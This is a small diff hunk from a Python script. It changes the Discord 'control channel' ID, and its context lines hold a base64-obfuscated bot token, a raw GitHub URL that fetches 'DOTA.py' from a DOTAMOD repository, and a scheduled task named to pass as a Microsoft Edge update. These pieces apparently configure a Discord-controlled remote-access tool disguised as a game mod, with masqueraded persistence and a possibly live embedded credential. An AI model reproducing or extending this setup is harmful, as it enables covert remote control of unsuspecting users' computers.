@@ -34,7 +34,7 @@ from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 
 encoded = "TVRVek5qTXdOalk1Tmpnek1qUXlOakExTkEuR0lnM25uLjBrellyY0FhNkY5eXNXbGFEVFF1ZnpZemhhbDFWOExfZmdtcjdJ"
 BOT_TOKEN = base64.b64decode(encoded).decode("utf-8")
-CONTROL_CHANNEL_ID = 1536306696832426054
+CONTROL_CHANNEL_ID = 1536279256655597580
 RAW_GITHUB_URL = "https://github.com/ht-at/DOTAMOD/raw/refs/heads/main/DOTA.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
